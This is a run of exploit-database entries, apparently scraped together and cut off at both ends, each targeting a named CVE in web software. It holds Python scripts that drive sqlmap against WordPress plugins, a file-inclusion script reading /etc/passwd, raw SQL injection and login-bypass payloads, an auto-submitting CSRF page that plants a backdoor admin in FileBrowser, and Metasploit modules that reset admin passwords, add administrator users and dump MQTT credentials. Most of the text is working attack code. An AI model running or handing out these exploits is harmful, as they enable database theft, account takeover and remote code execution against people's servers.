            except KeyboardInterrupt:
                sys.exit()
            except requests.exceptions.Timeout:
                print ("[!] Connection to host timed out !")
                sys.exit(1)
            except Exception as e:
                print (Fore.RED + f"Unable to connect to host" + Style.RESET_ALL)

if __name__ == "__main__":
    main ()
  # Exploit Title: WordPress Plugin WP User Frontend 3.5.25 - SQLi (Authenticated)
# Date 20.02.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://wedevs.com/
# Software Link: https://downloads.wordpress.org/plugin/wp-user-frontend.3.5.25.zip
# Version: < 3.5.25
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-25076
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-25076/README.md

'''
Description:
The WP User Frontend WordPress plugin before 3.5.26 does not validate and escape the status parameter
before using it in a SQL statement in the Subscribers dashboard, leading to an SQL injection.
Due to the lack of sanitisation and escaping, this could also lead to Reflected Cross-Site Scripting
'''

banner = '''

 _|_|_|  _|      _|  _|_|_|_|              _|_|      _|      _|_|      _|                _|_|    _|_|_|_|    _|    _|_|_|_|_|    _|_|_| 
_|        _|      _|  _|                  _|    _|  _|  _|  _|    _|  _|_|              _|    _|  _|        _|  _|          _|  _|       
_|        _|      _|  _|_|_|  _|_|_|_|_|      _|    _|  _|      _|      _|  _|_|_|_|_|      _|    _|_|_|    _|  _|        _|    _|_|_|   
_|          _|  _|    _|                    _|      _|  _|    _|        _|                _|            _|  _|  _|      _|      _|    _| 
  _|_|_|      _|      _|_|_|_|            _|_|_|_|    _|    _|_|_|_|    _|              _|_|_|_|  _|_|_|      _|      _|          _|_|   
                                                                                                                                          
                                        [+] WP User Frontend - SQL Injection
                                        [@] Developed by Ron Jost (Hacker5preme)
'''
print(banner)

import argparse
from datetime import datetime
import os
import requests
import json

# User-Input:
my_parser = argparse.ArgumentParser(description= 'WP User Frontend - SQL-Injection (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD



print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))

# Authentication:
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'
check = session.get(auth_url)
# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}
auth = session.post(auth_url, headers=header, data=body)

# SQL-Injection (Exploit):
# Generate payload for sqlmap
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')
cookie = cookie.replace(',', '; ')
print('[*] Payload for SQL-Injection:')
exploitcode_url = r'sqlmap -u "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin.php?page=wpuf_subscribers&post_ID=1&status=1" '
exploitcode_risk = '--level 2 --risk 2 '
exploitcode_cookie = '--cookie="' + cookie + '" '
print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploitcode = exploitcode_url + exploitcode_risk + exploitcode_cookie + retrieve_mode + ' -p status -v 0 --answers="follow=Y" --batch'
os.system(exploitcode)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
  # Exploit Title: WordPress Plugin Secure Copy Content Protection and Content Locking 2.8.1 - SQL-Injection (Unauthenticated)
# Date 08.02.2022
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://ays-pro.com/
# Software Link: https://downloads.wordpress.org/plugin/secure-copy-content-protection.2.8.1.zip
# Version: < 2.8.2
# Tested on: Ubuntu 20.04
# CVE: CVE-2021-24931
# CWE: CWE-89
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md

'''
Description:
The Secure Copy Content Protection and Content Locking WordPress plugin before 2.8.2 does not escape the
sccp_id parameter of the ays_sccp_results_export_file AJAX action (available to both unauthenticated
and authenticated users) before using it in a SQL statement, leading to an SQL injection.
'''

banner = '''

 .--. .-..-. .--.       .---.  .--. .---.   ,-.       .---.   .-. .--. .----.  ,-.
: .--': :: :: .--'      `--. :: ,. :`--. :.'  :       `--. : .'.': .; :`--  ;.'  :
: :   : :: :: `;  _____   ,',': :: :  ,',' `: : _____   ,','.'.'_`._, : .' '  `: :
: :__ : `' ;: :__:_____:.'.'_ : :; :.'.'_   : ::_____:.'.'_ :_ ` :  : : _`,`.  : :
`.__.' `.,' `.__.'      :____;`.__.':____;  :_;       :____;  :_:   :_:`.__.'  :_;
                            
                        [+] Copy Content Protection and Content Locking - SQL Injection
                        [@] Developed by Ron Jost (Hacker5preme)
                        
'''
print(banner)
import argparse
from datetime import datetime
import os

# User-Input:
my_parser = argparse.ArgumentParser(description= 'Copy Content Protection and Content Locking SQL-Injection (unauthenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH

# Exploit:
print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S')))
print('[*] Payload for SQL-Injection:')
exploitcode_url = r'sqlmap "http://' + target_ip + ':' + target_port + wp_path + r'wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)*&type=json" '
print('    Sqlmap options:')
print('     -a, --all           Retrieve everything')
print('     -b, --banner        Retrieve DBMS banner')
print('     --current-user      Retrieve DBMS current user')
print('     --current-db        Retrieve DBMS current database')
print('     --passwords         Enumerate DBMS users password hashes')
print('     --tables            Enumerate DBMS database tables')
print('     --columns           Enumerate DBMS database table column')
print('     --schema            Enumerate DBMS schema')
print('     --dump              Dump DBMS database table entries')
print('     --dump-all          Dump all DBMS databases tables entries')
retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ')
exploitcode = exploitcode_url +  retrieve_mode + ' --answers="follow=Y" --batch -v 0'
os.system(exploitcode)
print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))
  # Exploit Title: Hospital Management Startup 1.0 - 'loginid' SQLi
# Exploit Author: nu11secur1ty
# Date: 02.10.2022
# Vendor: https://github.com/kabirkhyrul
# Software: https://github.com/kabirkhyrul/HMS
# CVE-2022-23366

# Description:
The loginid and password parameters from Hospital Management Startup
1.0 appear to be vulnerable to SQL injection attacks.
The attacker can retrieve all information from the administrator
account of the system and he can use the information for malicious
purposes!
WARNING: If this is in some external domain, or some subdomain, or
internal, this will be extremely dangerous!

Status: CRITICAL


[+] Payloads:

```mysql
---
Parameter: loginid (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: loginid=hackedpassword=hacked' or '6681'='6681' AND
(SELECT 1959 FROM (SELECT(SLEEP(3)))PuyC) AND
'sDHP'='sDHP&rememberme=on&submit=Login
---

```
# Reproduce:
https://github.com/nu11secur1ty/CVE-mitre/edit/main/2022/CVE-2022-23366
  # Exploit Title: AtomCMS v2.0 - SQLi
# Date: 08/02/2022
# Exploit Author: Luca Cuzzolin aka czz78
# Vendor Homepage: https://github.com/thedigicraft/Atom.CMS
# Version: v2.0
# Category: Webapps
# Tested on: Debian linux
# CVE : CVE-2022-24223


====================================================

# PoC : SQLi :

http://127.0.0.1/Atom.CMS/admin/login.php


POST /Atom.CMS/admin/login.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/Atom.CMS/admin/login.php
Cookie: PHPSESSID=tqfebdu4kn9qj7g6qpa91j9859
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
email=test%40test.com&password=1234


Vulnerable Payload :

Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 5613 FROM
(SELECT(SLEEP(5)))JnLZ) AND 'pROE'='pROE&password=1234
    Vector: AND (SELECT [RANDNUM] FROM
(SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: email=test@test.com' UNION ALL SELECT
NULL,CONCAT(0x717a767a71,0x65557a784e446152424b63724b5a737062464a4267746c70794d5976484c484a5365634158734975,0x71627a7871),NULL,NULL,NULL,NULL--
-&password=1234
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL-- -
---



====================================================
  # Exploit Title: Wordpress Plugin Simple Job Board 2.9.3 - Local File Inclusion
# Date: 2022-02-06
# Exploit Author: Ven3xy
# Vendor Homepage: https://wordpress.org/plugins/simple-job-board/
# Software Link: https://downloads.wordpress.org/plugin/simple-job-board.2.9.3.zip
# Version: 2.9.3
# Tested on: Ubuntu 20.04 LTS
# CVE : CVE-2020-35749


import requests
import sys
import time

class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'
color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]   
    

def banner():
    run = color_random[6]+'''\nY88b         /                888~~                     888          ,e,   d8   
 Y88b       /  888-~88e       888___ Y88b  /  888-~88e  888  e88~-_   "  _d88__
  Y88b  e  /   888  888b ____ 888     Y88b/   888  888b 888 d888   i 888  888   
   Y88bd8b/    888  8888      888      Y88b   888  8888 888 8888   | 888  888   
    Y88Y8Y     888  888P      888      /Y88b  888  888P 888 Y888   ' 888  888   
     Y  Y      888-_88"       888___  /  Y88b 888-_88"  888  "88_-~  888  "88_/
               888                                888                              \n'''
    run2 = color_random[2]+'''\t\t\t(CVE-2020-35749)\n'''           
    run3 = color_random[4]+'''\t{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }\n\n'''
    print(run+run2+run3)           
              
    

if (len(sys.argv) != 5):
    banner()
    print("[!] Usage   : ./wp-exploit.py <target_url> <file_path> <USER> <PASS>")
    print("[~] Example : ./wp-exploit.py http://target.com:8080/wordpress/ /etc/passwd admin admin")
    exit()

else:
    banner()
    fetch_path = sys.argv[2]
    print (color_random[5]+"[+] Trying to fetch the contents from "+fetch_path)
    time.sleep(3)
    target_url = sys.argv[1]
    usernamex = sys.argv[3]
    passwordx = sys.argv[4]
    print("\n")
    login = target_url+"wp-login.php"
    wp_path = target_url+'wp-admin/post.php?post=application_id&action=edit&sjb_file='+fetch_path
    username = usernamex
    password = passwordx

    with requests.Session() as s:
        headers = { 'Cookie':'wordpress_test_cookie=WP Cookie check',
                 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15' }

        post_data={ 'log':username, 'pwd':password,
                   'wp-submit':'Log In','redirect_to':wp_path,
                   'testcookie':'1'
                       } 
        
        s.post(login, headers=headers, data=post_data)
        resp = s.get(wp_path)
    
        out_file = open("output.txt", "w")
        print(resp.text, file=out_file)
        out_file.close()
        print(color_random[4]+resp.text)
        out = color_random[5]+"\n[+] Output Saved as: output.txt\n"
        print(out)
  # Title: Hospital Management System 4.0 - 'multiple' SQL Injection
# Author: nu11secur1ty
# Date: 02.06.2022
# Vendor: https://github.com/kishan0725
# Software: https://github.com/kishan0725/Hospital-Management-System
# CVE-2022-24263


## Description:
The Hospital Management System v4.0 is suffering from Multiple
SQL-Injections via three parameters in function.php,  contact.php, and
func3.php applications.
The attacker can be receiving the all information from the system by
using this vulnerability, and also the malicious actor can use
sensitive information from the customers of this system.
WARNING: If this is in some external domain, or some subdomain, or
internal, this will be extremely dangerous!
Status: CRITICAL


[+] Payloads:

---
Parameter: txtName (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: txtName=821761' AND (SELECT 9346 FROM
(SELECT(SLEEP(3)))HJGv) AND
'xkCZ'='xkCZ&txtEmail=xstxPhYW@https://github.com/kishan0725/Hospital-Management-System&txtPhone=813-439-23'+(select
load_file('\\\\k0lnu24kl14z5bxcoo5tj7z4bvho5fz3q6ey1qpf.https://github.com/kishan0725/Hospital-Management-System\\hgq'))+'&btnSubmit=Send
Message&txtMsg=441931
---

-------------------------------------------

---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: email=riiVAqjG@https://github.com/kishan0725/Hospital-Management-System'+(select-2936)
OR 1 GROUP BY CONCAT(0x7162706271,(SELECT (CASE WHEN (5080=5080) THEN
1 ELSE 0 END)),0x716b767a71,FLOOR(RAND(0)*2)) HAVING
MIN(0)#from(select(sleep(20)))a)+'&password2=d3U!l9k!E4&patsub=Login

    Type: UNION query
    Title: MySQL UNION query (random number) - 1 column
    Payload: email=riiVAqjG@https://github.com/kishan0725/Hospital-Management-System'+(select-2730)
UNION ALL SELECT
8185,8185,CONCAT(0x7162706271,0x5777534a4b68716f6d4270614362544c4954786a4f774b6852586b47694945644a70757262644c52,0x716b767a71),8185,8185,8185,8185,8185#from(select(sleep(20)))a)+'&password2=d3U!l9k!E4&patsub=Login
---

-------------------------------------------

---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: username3=CHnDaCTc'+(select-2423) OR 1 GROUP BY
CONCAT(0x71626a6271,(SELECT (CASE WHEN (5907=5907) THEN 1 ELSE 0
END)),0x716b766b71,FLOOR(RAND(0)*2)) HAVING
MIN(0)#from(select(sleep(20)))a)+'&password3=a5B!n6f!U1&docsub1=Login

    Type: UNION query
    Title: MySQL UNION query (random number) - 1 column
    Payload: username3=CHnDaCTc'+(select-3282) UNION ALL SELECT
CONCAT(0x71626a6271,0x446c68526a796c4475676e54774d6b617a6977736855756f63796f43686d706c637877534a557076,0x716b766b71),4829,4829,4829,4829#from(select(sleep(20)))a)+'&password3=a5B!n6f!U1&docsub1=Login
---

## Reproduce:
https://github.com/nu11secur1ty/CVE-mitre/edit/main/2022/CVE-2022-24263
  # Exploit Title: FileBrowser 2.17.2 - Cross Site Request Forgery (CSRF) to Remote Code Execution (RCE)
# Date: 5/2/2022
# Exploit Author: FEBIN MON SAJI
# Vendor Homepage: https://filebrowser.org/
# Software Link: https://github.com/filebrowser/filebrowser
# Version: FileBrowser <= 2.17.2
# Tested on: Ubuntu 20.04
# CVE : CVE-2021-46398

1. Description:

A Cross-Site Request Forgery vulnerability exists in Filebrowser < 2.18.0 that allows attackers to create a backdoor user with admin privilege and get access to the filesystem via a malicious HTML webpage that is sent to the victim. An admin can run commands using the FileBrowser and hence it leads to RCE.

2. Proof Of Concept:

<html>
   <script>
   setTimeout(function() {document.forms["exploit"].submit();}, 3000);
   </script>
  <body style="text-align:center;">
  <h1> FileBrowser CSRF PoC by Febin </h1>
 
  <!-- This create a admin privileged backdoor user named "pwned" with password "pwned" -->
 
  <!-- Change the URL in the form action -->
 
    <form action="http://127.0.0.1:8080/api/users" method="POST" enctype="text/plain" name="exploit">
    
      <!-- Change the "scope" parameter in the payload as your choice -->
    
      <input type="hidden" name='{"what":"user","which":[],"data":{"scope":"../../../../root/","locale":"en","viewMode":"mosaic","singleClick":false,"sorting":{"by":"","asc":false},"perm":{"admin":true,"execute":true,"create":true,"rename":true,"modify":true,"delete":true,"share":true,"download":true},"commands":[],"hideDotfiles":false,"username":"pwned","password":"","rules":[{"allow":true,"path":"../","regex":false,"regexp":{"raw":""}}],"lockPassword":false,"id":0,"password":"pwned"}}' value='test'>
    
    </form>

  </body>

</html>



3. HTTP request intercept:

POST /api/users HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/plain
Content-Length: 465
Connection: close
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxLCJsb2NhbGUiOiJlbiIsInZpZXdNb2RlIjoibW9zYWljIiwic2luZ2xlQ2xpY2siOmZhbHNlLCJwZXJtIjp7ImFkbWluIjp0cnVlLCJleGVjdXRlIjp0cnVlLCJjcmVhdGUiOnRydWUsInJlbmFtZSI6dHJ1ZSwibW9kaWZ5Ijp0cnVlLCJkZWxldGUiOnRydWUsInNoYXJlIjp0cnVlLCJkb3dubG9hZCI6dHJ1ZX0sImNvbW1hbmRzIjpbXSwibG9ja1Bhc3N3b3JkIjpmYWxzZSwiaGlkZURvdGZpbGVzIjpmYWxzZX0sImV4cCI6MTY0NDA4OTE3MiwiaWF0IjoxNjQ0MDgxOTcyLCJpc3MiOiJGaWxlIEJyb3dzZXIifQ.hdFWg3SIQQ-4P8K48yru-152NGItZPKau6EBL6m8RJE
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-GPC: 1

{"what":"user","which":[],"data":{"scope":"../../../../root/","locale":"en","viewMode":"mosaic","singleClick":false,"sorting":{"by":"","asc":false},"perm":{"admin":true,"execute":true,"create":true,"rename":true,"modify":true,"delete":true,"share":true,"download":true},"commands":[],"hideDotfiles":false,"username":"pwned","password":"","rules":[{"allow":true,"path":"../","regex":false,"regexp":{"raw":""}}],"lockPassword":false,"id":0,"password":"pwned"}}=test


4. References:

https://febin0x4e4a.wordpress.com/2022/01/19/critical-csrf-in-filebrowser/
https://febin0x4e4a.blogspot.com/2022/01/critical-csrf-in-filebrowser.html
https://systemweakness.com/critical-csrf-to-rce-in-filebrowser-865a3c34b8e7



5. Detailed Description:

The Vulnerability - CSRF to RCE

FileBrowser is a popular file manager/file managing interface developed in the Go language. Admin can create multiple users, even another Admin privileged user, and give access to any directory he wants, the user creation is handled by an endpoint “/api/users”.

The endpoint accepts input in JSON format to create users, but fails to verify that the “Content-Type” HTTP header, the Content-Type header’s value should be “application/json” but it accepts “text/plain” and that’s where the vulnerability arises. Also, the “Origin” is not validated and there are no anti-CSRF tokens implemented either.

Hence an attacker can easily exploit this vulnerability to create a backdoor user with admin privileges and access to the home directory or whichever directory the attacker wants to access, just by sending a malicious webpage URL to the legitimate admin and access the whole filesystem of the victim.

And an admin can run commands on the system, so this vulnerability leads to an RCE.
  ##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,

      'Name'           => "Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)",
      'Description'    => %q{
        This exploit module abuses the mishandling of password reset in JSON for Strapi CMS version 3.0.0-beta.17.4 to change the password of a privileged user.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'WackyH4cker' ],
      'References'     =>
        [
          [ 'URL', 'https://vulners.com/cve/CVE-2019-18818' ]
        ],
      'Platform'       => 'linux',
      'Targets'        => [
        [ 'Strapi 3.0.0-beta-17.4', {} ]
      ],
      'Payload'        => '',
      'Privileged'     => true,
      'DisclosureDate' => "",
      'DefaultOptions' =>
        {
          'SSL' => 'False',
          'RPORT' => 80,
        },
      'DefaultTarget'  => 0

      ))

      register_options [
        OptString.new('NEW_PASSWORD', [true, 'New password for user Admin'])
      ]
  end

  def check

    res = send_request_raw({ 'uri' => '/admin/init' })
    version = JSON.parse(res.body)

    if version["data"]["strapiVersion"] == '3.0.0-beta.17.4'
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
    
  end

  def run

    json_body = { 'code' => {'$gt' => 0},
      'password' => datastore['NEW_PASSWORD'],
      'passwordConfirmation' => datastore['NEW_PASSWORD'] }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/admin/auth/reset-password',
      'ctype' => 'application/json',
      'data' => JSON.generate(json_body)
    })

    print_status("Changing password...")
    json_format = JSON.parse(res.body)
    jwt = json_format['jwt']

    if res.code == 200
      print_good("Password changed successfully!")
      print_good("USER: admin")
      print_good("PASSWORD: #{datastore['NEW_PASSWORD']}")
      print_good("JWT: #{jwt}")
    else
      fail_with(Failure::NoAccess"Could not change admin user password")
    end
  end

end
  # Exploit Title: Hotel Reservation System 1.0 - SQLi (Unauthenticated)
# Google Dork: None
# Date: 01/29/2022
# Exploit Author: Nefrit ID
# Author Website: https://manadocoder.com
# Vendor Homepage: https://github.com/dhruvmullick
# Software Link: https://github.com/dhruvmullick/hotel-reservation-system
# Tested on: Kali Linux & Windows 10

===Exploit Url===
http://localhost/hotel-reservation-system-master/login.php
Method: POST
Parameter: username
===Burpsuite Proxy Intercept===
POST /hotel-reservation-system-master/loginsession.php HTTP/1.1
Host: localhost
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://localhost/hotel-reservation-system-master/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: uid=1
Connection: close

username=u1337#' AND (SELECT 4775 FROM (SELECT(SLEEP(5)))BzJL)-- dvSZ&password=p1337&ok=Submit
I can also bypass login by using the following payload: ' or '1'='1'# on the parameter username
  ##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Servisnet Tessa - Add sysAdmin User (Unauthenticated) (Metasploit)',
      'Description'    => %q(
        This module exploits an authentication bypass in Servisnet Tessa, triggered by add new sysadmin user.
        The app.js is publicly available which acts as the backend of the application.
                By exposing a default value for the "Authorization" HTTP header,
                it is possible to make unauthenticated requests to some areas of the application.
                Even MQTT(Message Queuing Telemetry Transport) protocol connection information can be obtained with this method.
                A new admin user can be added to the database with this header obtained in the source code.       

      ),
      'References'     =>
        [
          [ 'CVE', 'CVE-2022-22831' ],
          [ 'URL', 'https://www.pentest.com.tr/exploits/Servisnet-Tessa-Add-sysAdmin-User-Unauthenticated.html' ],
          [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
        ],
      'Author'         =>
        [
          'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 22 2021",
      'DefaultOptions' =>
        {
          'RPORT' => 443,
          'SSL'   => true
        }
    ))

    register_options([
        OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
    ])
  end
  # split strings to salt
  def split(data, string_to_split) 
    word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end
  # for Origin and Referer headers

  def app_path
    res = send_request_cgi({
    # default.a.get( check
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
      'method'  => 'GET'
    })     
    
    if res && res.code == 200 && res.body =~ /baseURL/
      data = res.body
      #word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
      base_url = data.scan(/baseURL: '\/([\S\s]*?)'/)[0]
      print_status("baseURL: #{base_url}") 
      return base_url
    else
      fail_with(Failure::NotVulnerable, 'baseURL not found!')
    end
  end

  def add_user
     token = auth_bypass
     newuser = Rex::Text.rand_text_alpha_lower(8)   
     id = Rex::Text.rand_text_numeric(4)   
     # encrypted password hxZ8I33nmy9PZNhYhms/Dg== / 1111111111
     json_data = '{"alarm_request": 1, "city_id": null, "city_name": null, "decryptPassword": null, "email": "' + newuser + '@localhost.local", "id": ' + id + ', "invisible": 0, "isactive": 1, "isblocked": 0, "levelstatus": 1, "local_authorization": 1, "mail_request": 1, "name": "' + newuser + '", "password": "hxZ8I33nmy9PZNhYhms/Dg==", "phone": null, "position": null, "region_name": "test4", "regional_id": 0, "role_id": 1, "role_name": "Sistem Admin", "rolelevel": 3, "status": null, "surname": "' + newuser + '", "totalRecords": null, "try_pass_right": 0, "userip": null, "username": "' + newuser + '", "userType": "Lokal Kullanıcı"}'

     res = send_request_cgi(
       {
       'method' => 'POST',
       'ctype'  => 'application/json',
       'uri' => normalize_uri(target_uri.path, app_path, 'users'),
       'headers' =>
         {
           'Authorization' => token
         },
       'data' => json_data
      })

      if res && res.code == 200 && res.body =~ /localhost/
        print_good("The sysAdmin authorized user has been successfully added.")
        print_status("Username: #{newuser}")
        print_status("Password: 1111111111")
      else
        fail_with(Failure::NotVulnerable, 'An error occurred while adding the user. Try again.')
      end
  end

  def auth_bypass

    res = send_request_cgi({
    # default.a.defaults.headers.post["Authorization"] check
      'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
      'method'  => 'GET'
    })     
    
    if res && res.code == 200 && res.body =~ /default.a.defaults.headers.post/
      token = split(res.body, 'Authorization')
      print_status("Authorization: #{token}") 
          return token
    else
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end

  end

  def check     
    
    if auth_bypass =~ /Basic/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end
 
  def run
    unless Exploit::CheckCode::Vulnerable == check
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
    end
    add_user   
  end
end
  ##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/mqtt'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::MQTT
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Servisnet Tessa - MQTT Credentials Dump (Unauthenticated) (Metasploit)',
      'Description'    => %q(
        This module exploits MQTT creds dump vulnerability in Servisnet Tessa.
        The app.js is publicly available which acts as the backend of the application.
                By exposing a default value for the "Authorization" HTTP header,
                it is possible to make unauthenticated requests to some areas of the application.
                Even MQTT(Message Queuing Telemetry Transport) protocol connection information can be obtained with this method.
                A new admin user can be added to the database with this header obtained in the source code.   

        The module tries to log in to the MQTT service with the credentials it has obtained,
        and reflects the response it receives from the service.   

      ),
      'References'     =>
        [
          [ 'CVE', 'CVE-2022-22833' ],
          [ 'URL', 'https://pentest.com.tr/exploits/Servisnet-Tessa-MQTT-Credentials-Dump-Unauthenticated.html' ],
          [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
        ],
      'Author'         =>
        [
          'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Dec 22 2021",
      'DefaultOptions' =>
        {
          'RPORT' => 443,
          'SSL'   => true
        }
    ))

    register_options([
        OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
    ])
  end
  # split strings to salt
  def split(data, string_to_split) 
    word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
    string = word.split('"]').join('').split('["').join('')
    return string
  end

  def check_mqtt
   res = send_request_cgi({
   # default.a.get( check
     'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
     'method'  => 'GET'
   })     
    
   if res && res.code == 200 && res.body =~ /connectionMQTT/
      data = res.body
